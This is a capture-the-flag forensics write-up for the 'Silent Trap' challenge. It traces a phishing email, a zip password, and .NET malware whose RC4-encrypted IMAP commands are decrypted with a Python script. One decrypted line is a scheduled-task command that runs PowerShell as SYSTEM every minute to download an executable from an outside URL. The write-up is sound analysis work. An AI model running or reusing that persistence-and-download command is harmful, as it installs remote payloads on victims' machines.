---
layout: load_md
title: The White Circle | Cyber Apocalypse 2025 | Silent Trap Writeup
desc: Check out our writeup for Silent Trap for Cyber Apocalypse 2025 capture the flag competition.
image: images/twc_og_banner.jpg
ctf: Cyber Apocalypse 2025
parent: cyber_apocalypse_2025
category: forensics
challenge: Silent Trap
tags: "forensics, starry, pcap, wireshark, eml, zip, dotnet, rc4, encryption"
date: 2025-03-29T00:00:00+00:00
last_modified_at: 2025-03-29T00:00:00+00:00
---

> Solved by Starry-Lord


![](https://i.imgur.com/niU7beE.png)


For this challenge we had a packet capture to read with Wireshark.

Question 1:
First mail opened and replied to:

![](https://i.imgur.com/VNm3FLv.png)


Answer: 

    Game Crash on Level 5

Question 2:

![](https://i.imgur.com/xnFooRH.png)


Answer:

    2025-02-24_15:46

Question 3:
This started to become interesting now. The zip was not cracking with any dictionary I had, but I eventually found this packet with the content of the email, with password for the zip:

![](https://i.imgur.com/F2Gaenv.png)



![](https://i.imgur.com/dMd0xzC.png)

    eldoriaismylife

Then taking the hash for the pdf.exe file inside the archive.

Question 4:
Credentials used to log in the attacker mailbox were the following:


![](https://i.imgur.com/XIPDg73.png)

    proplayer@email.com:completed

Question 5:
The task scheduled by the attacker could be found by decrypting the encrypted base64 looking strings in IMAP protocol packets, so it was time to look into the executable received:


    file Eldoria_Balance_Issue_Report.pdf.exe                                                                                                                                                                                              
    Eldoria_Balance_Issue_Report.pdf.exe: PE32 executable (GUI) Intel 80386 Mono/.Net assembly, for MS Windows, 3 sections

I disabled defender because it was eating the file sent from WSL to Windows, and used ILSpy which allowed me to find out the XOR key used for obfuscating the messages sent through IMAP/IMF packets. Following the streams in Wireshark allowed to see a few of them:

![](https://i.imgur.com/LmkRRmr.png)


About the executable, `<PrivateImplementationDetails>` which was only visible with IL in ILSpy was showing 2 possible candidates for 256 bytes XOR key as follows:


    .class private auto ansi '<Module>'
    {
    } // end of class <Module>
    
    .class private auto ansi sealed '<PrivateImplementationDetails>'
        extends [mscorlib]System.Object
    {
        .custom instance void [mscorlib]System.Runtime.CompilerServices.CompilerGeneratedAttribute::.ctor() = (
            01 00 00 00
        )
        // Nested Types
        .class nested private explicit ansi sealed '__StaticArrayInitTypeSize=256'
            extends [mscorlib]System.ValueType
        {
            .pack 1
            .size 256
    
        } // end of class __StaticArrayInitTypeSize=256
    
    
        // Fields
        .field assembly static initonly valuetype '<PrivateImplementationDetails>'/'__StaticArrayInitTypeSize=256' ACC3B83AE99DC619D5DE5E5089E213F9DD3B830C549DD557E66A456CA3BB3660 at I_00002050
        .data cil I_00002050 = bytearray (
            8c 18 63 4c 63 74 ce 4e 75 f1 55 f8 06 80 8f 05
            32 fe f8 a8 47 2d b2 54 33 90 a3 a4 8c b6 9b 7c
            b1 43 bc e1 39 91 9d 33 c2 09 22 01 70 f0 d9 8f
            de 4f a4 97 f6 68 ec 18 0a e2 9f 13 db ec e3 3e
            97 d5 e8 43 86 19 ce 70 28 3d dc 0a 39 2a 27 19
            3a 04 3e 02 6f c4 5e b3 9a 44 f3 52 6f 80 f7 20
            f3 96 6a a1 71 be 57 74 83 be 7d 1c f6 0b 50 cc
            96 ba 56 fe e5 49 09 a3 19 e3 c9 45 b3 42 b8 9e
            ad a4 90 ea 86 31 90 8f 2e 28 71 ef 55 6b f1 21
            e6 1d e9 35 1e 41 d1 9d 24 71 4b d0 71 aa 3e 22
            ce e9 16 d0 84 59 d9 07 16 70 b6 16 03 12 8a 5c
            2d 57 81 08 6d b1 1e 55 80 cc 55 cb ee 71 67 91
            c3 69 86 b9 10 86 30 5f a4 e4 7d 8e e3 70 e8 f1
            72 2c a8 cd a9 44 ed 8e 25 50 f2 9c a2 85 ec 63
            cd 89 3a 12 31 01 cb 92 7c e9 b7 96 47 ae 33 17
            26 06 6d 62 64 28 0c 9a 4a e5 40 c2 79 98 66 69
        )
    
    } // end of class <PrivateImplementationDetails>
    
    .class private auto ansi sealed '<PrivateImplementationDetails><5ceda002-b6a9-4e52-b13e-d38ba653d933_netmodule>'
        extends [mscorlib]System.Object
    {
        .custom instance void [mscorlib]System.Runtime.CompilerServices.CompilerGeneratedAttribute::.ctor() = (
            01 00 00 00
        )
        // Nested Types
        .class nested private explicit ansi sealed '__StaticArrayInitTypeSize=256'
            extends [mscorlib]System.ValueType
        {
            .pack 1
            .size 256
    
        } // end of class __StaticArrayInitTypeSize=256
    
    
        // Fields
        .field assembly static initonly valuetype '<PrivateImplementationDetails><5ceda002-b6a9-4e52-b13e-d38ba653d933_netmodule>'/'__StaticArrayInitTypeSize=256' '83F58C5748F2CE8CD1361409C48007E4CD0C037A70CD9FCD968880CFCCD616E2' at I_00002150
        .data cil I_00002150 = bytearray (
            a8 73 ae d5 a8 de 48 24 5b d1 f2 80 45 63 c3 a4
            ee b6 43 5c 07 79 a4 56 79 0a 5d 04 8c 6f f8 2c
            1e 5e 30 36 2d 64 b8 36 1c 52 c9 bc cb 96 7b a3
            e5 8a b1 33 a4 e8 56 9a b3 8f 90 16 86 0c 28 f3
            37 02 49 67 63 f3 ec 77 09 78 f7 19 84 89 43 42
            6f f0 6c 56 55 3f 2c 31 f1 06 03 aa 83 96 35 31
            7e 48 3c 24 90 f8 37 0a f1 d0 a3 d9 31 9a ce e3
            19 63 12 90 86 a9 ed 64 75 16 0b 96 9d e6 ad 26
            48 63 81 1e dc 70 e2 38 10 72 85 16 60 01 5a 48
            a2 26 8f ba 23 8e 80 ea c4 ef 86 b2 cd e5 79 e1
            f6 e8 cd ec fe 98 91 62 7e 1d d9 4a b1 8e 13 be
            b6 97 e9 9d 4c 4a 68 9b 4f 73 05 12 cc 41 fe cc
            76 47 5c 21 3a 70 ce 97 67 b3 18 a4 db 62 51 06
            f1 64 e4 be 60 8c 80 01 a1 f6 ec 19 3e 64 57 91
            b9 2d 3d 8f 34 08 e3 20 e9 25 b7 65 59 18 7d cb
            e3 09 92 9c d0 ce c2 86 c2 17 e9 64 26 9e 3a 9f
        )
    
    } // end of class <PrivateImplementationDetails><5ceda002-b6a9-4e52-b13e-d38ba653d933_netmodule>
    

in the method `imap_chanel.Exor::Encrypt()` we could see a few things happening: 

- Builds a key-scheduling array (`S`)
- Does the standard RC4 PRGA to encrypt/decrypt the data

`imap_chanel.Exor::Encrypt()`:


    // email, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
    // imap_chanel.Exor
    public static byte[] Encrypt(byte[] pwd, byte[] data)
    {
        int[] array = new int[256];
        int[] array2 = new int[256];
        byte[] array3 = new byte[data.Length];
        int i;
        for (i = 0; i < 256; i++)
        {
            array[i] = pwd[i % pwd.Length];
            array2[i] = i;
        }
        int num = (i = 0);
        for (; i < 256; i++)
        {
            num = (num + array2[i] + array[i]) % 256;
            int num2 = array2[i];
            array2[i] = array2[num];
            array2[num] = num2;
        }
        int num3 = (num = (i = 0));
        for (; i < data.Length; i++)
        {
            num3++;
            num3 %= 256;
            num += array2[num3];
            num %= 256;
            int num2 = array2[num3];
            array2[num3] = array2[num];
            array2[num] = num2;
            int num4 = array2[(array2[num3] + array2[num]) % 256];
            array3[i] = (byte)(data[i] ^ num4);
        }
        return array3;
    }

The code was looking very similar to RC4 https://en.wikipedia.org/wiki/RC4
We could see the blocs were very identical to the Key-scheduling algorithm (KSA) and the Pseudo Random Generation algorithm (PRGA) from Wikipedia.

Decrypt_rc4.py:


    #!/usr/bin/env python3
    import base64
    import sys
    
    # 256-byte RC4 key from malware binary
    key_bytes = bytes.fromhex("""
    a873aed5a8de48245bd1f2804563c3a4eeb6435c0779a456790a5d048c6ff82c
    1e5e30362d64b8361c52c9bccb967ba3e58ab133a4e8569ab38f9016860c28f3
    3702496763f3ec770978f719848943426ff06c56553f2c31f10603aa83963531
    7e483c2490f8370af1d0a3d9319acee31963129086a9ed6475160b969de6ad26
    4863811edc70e2381072851660015a48a2268fba238e80eac4ef86b2cde579e1
    f6e8cdecfe9891627e1dd94ab18e13beb697e99d4c4a689b4f730512cc41fecc
    76475c213a70ce9767b318a4db625106f164e4be608c8001a1f6ec193e645791
    b92d3d8f3408e320e925b76559187dcbe309929cd0cec286c217e964269e3a9f
    """)
    
    def rc4_crypt(data: bytes, key: bytes) -> bytes:
        S = list(range(256))
        j = 0
        for i in range(256):
            j = (j + S[i] + key[i % len(key)]) % 256
            S[i], S[j] = S[j], S[i]
    
        i = j = 0
        out = bytearray()
        for byte in data:
            i = (i + 1) % 256
            j = (j + S[i]) % 256
            S[i], S[j] = S[j], S[i]
            K = S[(S[i] + S[j]) % 256]
            out.append(byte ^ K)
        return bytes(out)
    
    def main():
        if len(sys.argv) != 2:
            print("Usage: python decrypt_rc4.py <Base64Input>")
            sys.exit(1)
    
        b64_input = sys.argv[1]
        try:
            encrypted_bytes = base64.b64decode(b64_input)
        except Exception as e:
            print("Invalid Base64 input:", e)
            sys.exit(1)
    
        decrypted_bytes = rc4_crypt(encrypted_bytes, key_bytes)
    
        try:
            print("[+] Decrypted text:", decrypted_bytes.decode("utf-8"))
        except UnicodeDecodeError:
            print("[+] Decrypted bytes (non-UTF8):", decrypted_bytes)
    
    if __name__ == "__main__":
        main()
    

Back to question 5 about the name of the scheduled task:


    [+] Decrypted text: schtasks /create /tn Synchronization /tr "powershell.exe -ExecutionPolicy Bypass -Command Invoke-WebRequest -Uri https://www.mediafire.com/view/wlq9mlfrl0nlcuk/rakalam.exe/file -OutFile C:\Temp\rakalam.exe" /sc minute /mo 1 /ru SYSTEM

Answer:

    Synchronization

Question 6: API key discovered by the attacker


![](https://i.imgur.com/bEqE9HY.png)


Answer:

    sk-3498fwe09r8fw3f98fw9832fw


